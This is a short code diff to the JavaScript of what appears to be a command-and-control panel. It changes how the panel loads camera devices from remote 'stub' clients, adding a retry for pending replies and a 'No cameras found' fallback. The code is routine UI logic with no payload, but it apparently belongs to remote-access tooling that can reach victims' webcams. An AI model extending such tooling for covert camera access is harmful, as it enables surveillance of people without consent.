@@ -1097,7 +1097,12 @@
                 const res = await fetch('/api/c2/camera_devices/' + encodeURIComponent(clientId));
                 if (res.ok) {
                     const devices = await res.json();
-                    if (devices && devices.length > 0) {
+                    if (devices === null) {
+                        // Server still waiting for stub response — retry
+                        setTimeout(loadCameraDevices, 2000);
+                        return;
+                    }
+                    if (devices.length > 0) {
                         camSelect.innerHTML = '';
                         devices.forEach(d => {
                             const opt = document.createElement('option');
@@ -1108,9 +1113,12 @@
                         camDevicesLoaded = true;
                         return;
                     }
+                    // devices === [] — stub has no cameras
+                    camSelect.innerHTML = '<option value="0">No cameras found</option>';
+                    camDevicesLoaded = true;
+                    return;
                 }
             } catch {}
-            // still no devices — retry in 2s (server requested list from client, waiting for response)
             setTimeout(loadCameraDevices, 2000);
         }
 
